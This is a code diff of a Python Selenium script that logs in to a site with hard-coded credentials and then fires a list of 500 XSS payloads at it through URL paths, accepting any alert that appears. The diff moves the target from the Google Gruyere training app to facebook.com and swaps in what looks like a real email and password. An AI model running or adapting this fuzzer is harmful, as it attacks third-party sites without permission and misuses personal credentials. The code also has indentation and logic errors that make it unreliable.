@@ -9,105 +9,125 @@ from selenium.webdriver.support import expected_conditions as EC
 from selenium.common.exceptions import TimeoutException
 
 
-base_url = "https://google-gruyere.appspot.com/618655413586375839657115594994104056558"
-# base_url = "https://www.facebook.com"
-#------------------------------------#
 # reg_url = "http://google-gruyere.appspot.com/start"
-#------------------------------------#
-#info to create a new users
-user = "demo2019"
-password = "123456"
-#------------------------------------#
+
+base_url = "https://google-gruyere.appspot.com/618655413586375839657115594994104056558"
+base_url = "https://www.facebook.com"
+
+
 #user login page with passed info
 url_login = base_url + "/login"
 
-#add a session to the request
-s = requests.session()
-#create a header to add it to the request
-headers = {
-	'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0'
-}
-
-
-request = s.get(url_login)
-
-#parse HTML page
-parseHTML = BeautifulSoup(request.text, 'html.parser')
-
-#Extract the form name using Beautifull Soap
-htmlForm = parseHTML.form
-# print(parseHTML)
-
-inputs = htmlForm.find_all('input', type=["text", "password"])
-	
-#Extract Input Field Names
-inputFieldNames = []
-
-for items in inputs:
-	if items.has_attr('name'):
-		inputFieldNames.append(items['name'])
-
-
-time.sleep(1)
-
 
 browser = webdriver.Firefox()
-browser.get(url_login) 
-
-
-#Extract Input Field Labels
-inputFieldLabels = []
-
-
-for i in range(len(inputFieldNames)):
-	input_tag = str(inputs[i].parent.previous_sibling).replace(":", "").replace('\n','')
-	input_label_text = BeautifulSoup(input_tag, 'html.parser').get_text()
-	inputFieldLabels.append(input_label_text)
 
 
 
-for i in range(len(inputFieldLabels)):
-	if "user" in inputFieldNames[i] or "user" in inputFieldLabels[i] or "email" in inputFieldNames[i] or "email" in inputFieldLabels[i]:
-		browser.find_element_by_name(inputFieldNames[i]).send_keys(user)
-		# print(user)
-	if "pass" in inputFieldNames[i] or "pass" in inputFieldLabels[i]:
-		browser.find_element_by_name(inputFieldNames[i]).send_keys(password)
-		# print(password)
-	
-# print(inputFieldNames)
+
+#info to create a new users
+user = "smith.jhsn@gmail.com"
+password = "smith2013"
 
 
 
-time.sleep(3)
+#get all input fields to find crdentials login fields
+def getAllInputFields():
+	#add a session to the request
+	s = requests.session()
+	#send login request
+	request = s.get(url_login)
+	#parse HTML page
+	parseHTML = BeautifulSoup(request.text, 'html.parser')
+	#Extract the form name using Beautifull Soap
+	htmlForm = parseHTML.form
+	#find all input fields for user/email and password fields
+	inputs = htmlForm.find_all('input', type=["text", "password"])
+	return inputs
 
-login_attempt = browser.find_element_by_xpath("""//input[@type='submit' or @value='1']""")
-login_attempt.submit()
+#Extract Input Field Names
+def inputFieldNames(inputs):
+	inputFieldNames = []
+	for items in inputs:
+		if items.has_attr('name'):
+			inputFieldNames.append(items['name'])
+	return inputFieldNames
 
-time.sleep(3)
 
 
-# current_url = browser.current_url
+#extract input field labels
+def inputFieldLabels(inputFieldNames):
+	inputFieldLabels = []
+	for i in range(len(inputFieldNames)):
+		input_tag = str(inputs[i].parent.previous_sibling).replace(":", "").replace('\n','')
+		input_label_text = BeautifulSoup(input_tag, 'html.parser').get_text()
+		inputFieldLabels.append(input_label_text)
+	return inputFieldLabels
 
 
+#find login fields to pass credentials to
+def findLoginFields(browser,inputFieldNames, inputFieldLabels): 
+	for i in range(len(inputFieldLabels)):
+		if "user" in inputFieldNames[i] or "user" in inputFieldLabels[i] or "email" in inputFieldNames[i] or "email" in inputFieldLabels[i]:
+			browser.find_element_by_name(inputFieldNames[i]).send_keys(user)
+			print("user passed to try to login")
+		if "pass" in inputFieldNames[i] or "pass" in inputFieldLabels[i]:
+			browser.find_element_by_name(inputFieldNames[i]).send_keys(password)
+			print("password passed to try to login")
+
+
+def findLoginButtonAndClick(browser):
+	try:
+		login_attempt = browser.find_element_by_xpath("""//input[@type='submit']""")
+		print("submit input clicked")
+		login_attempt.submit()
+		print("logged in")
+	except:
+		login_attempt = browser.find_element_by_xpath("""//button[@type='submit']""")
+		print("submit button clicked")
+		login_attempt.submit()
+		print("logged in")
+	else:
+		print("didn't login")
+
+
+
+
+#handle if alert pops up to be able to go to the next script
 def handleAlert(browser, base_url, payload, sleep_time):
   newurl = str(base_url)+"/"+str(payload)
   browser.get(newurl);
   try:
-    WebDriverWait(browser, 3).until(EC.alert_is_present(),
+    WebDriverWait(browser, 1).until(EC.alert_is_present(),
                                    'Timed out waiting for PA creation ' +
                                    'confirmation popup to appear.')
 
     alert = browser.switch_to.alert
     alert.accept()
-    print("alert accepted")
+    print("alert popped up and accepted")
   except TimeoutException:
-    print("no alert")
+    print("no alert popped up")
   time.sleep(sleep_time)
 
 
 
+#injecting top500 xss scripts to the target
+def injectPayload(payloads):
+	with open(payloads, "r") as pl:
+		print("started injecting payloads")
+	  	for payload in pl:
+	  		handleAlert(browser, base_url, payload, 1)
 
 
-with open("xss-top500.txt", "r") as payloads:
-  for payload in payloads:
-    handleAlert(browser, base_url, payload, 1)
+
+inputs = getAllInputFields()
+inputFieldNames = inputFieldNames(inputs)
+inputFieldLabels = inputFieldLabels(inputFieldNames)
+
+#login to the url
+browser.get(url_login) 
+
+findLoginFields(browser, inputFieldNames, inputFieldLabels)		
+findLoginButtonAndClick(browser)
+time.sleep(3)
+
+injectPayload("xss-top500.txt")
